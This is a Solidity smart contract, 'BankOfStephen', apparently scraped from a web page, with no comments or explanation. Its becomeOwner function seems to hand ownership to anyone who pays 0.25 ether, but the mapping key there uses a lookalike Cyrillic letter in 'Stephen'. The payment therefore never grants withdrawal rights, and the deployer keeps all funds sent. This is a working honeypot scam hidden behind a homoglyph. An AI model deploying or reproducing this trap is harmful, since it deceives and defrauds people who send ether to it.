pragma solidity ^0.4.24;

contract BankOfStephen{

mapping(bytes32 =&gt; address) private owner;

constructor() public{
    owner[&#39;Stephen&#39;] = msg.sender;
}

function becomeOwner() public payable{
    require(msg.value &gt;= 0.25 ether);        
    owner[&#39;Stephеn&#39;] = msg.sender; 
}

function withdraw() public{
    require(owner[&#39;Stephen&#39;] == msg.sender);
    msg.sender.transfer(address(this).balance);
}

function() public payable {}

}